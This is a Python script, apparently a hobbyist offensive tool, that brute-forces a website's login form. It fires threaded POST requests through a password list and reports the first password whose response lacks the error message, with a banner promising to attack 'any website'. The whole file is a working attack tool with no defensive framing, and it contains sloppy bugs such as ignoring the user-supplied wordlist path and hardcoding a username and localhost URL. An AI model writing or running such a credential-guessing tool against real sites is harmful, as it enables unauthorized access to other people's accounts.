

#!/bin/python3

import requests
from termcolor import colored
import sys
import threading

def b(username,url,inputusername,inputpassword,inputsubmit,errormsg,inputsubmitvalue,password):
        print(colored("[!] Tring to BruteForce with password "+password,'blue'))
        data_dictionary = {inputusername:username,inputpassword:password,inputsubmit:inputsubmitvalue}

        response=requests.post(url,data=data_dictionary)
        response=str(response.content)
       # print(response.strip("\\n"))
        if errormsg in response:
            pass
        else:
            print(colored("[+] User_name ==> "+username,'green'))
            print(colored("[+] Password  ==> "+password,'green'))
            sys.exit()

def bruteforce(username,url,inputusername,inputpassword,inputsubmit,errormsg,inputsubmitvalue):
    for password in passwords:
        password=password.strip()
        t=threading.Thread(target=b,args=(username,url,inputusername,inputpassword,inputsubmit,errormsg,inputsubmitvalue,password))
        t.start()

        
print(colored('''          *********************************************************
          *                                                       *
          *         BruteForcing Login form of any website        *
          *                                                       *
          ********************************************************* ''','yellow'))
try:
    page_url=input("Enter the URL for example:http://192.168.43.24/index.php :")
    inputname=input("Enter the name of the firstinput like username or name :")
    inputpassword=input("Enter the name of the secondinput like password or passwrd :")
    inputsubmit=input("Enter the name of the submit value like submit :")
    inputsubmitvalue=input("Enter the input Submit value name :")
    errormsg=input("Enter the Error message :")
    username=input("Enter the User name  : ")
    file1=input("Enter the file path of list of passwords :")
    with open('p.txt',"r") as passwords:
           # bruteforce(username,page_url,inputname,inputpassword,inputsubmit,errormsg,inputsubmitvalue)
            bruteforce('praju','http://localhost/Loginpost/login.php','username','password','submit','Username and Password do not match.','')
            
except KeyboardInterrupt:
    print(colored("\nPressed ctrl c forced exit",'red'))
except FileNotFoundError:
    print(colored("File not Found",'red'))
print(colored("[---]Login Failure ==> Password not found",'red'))
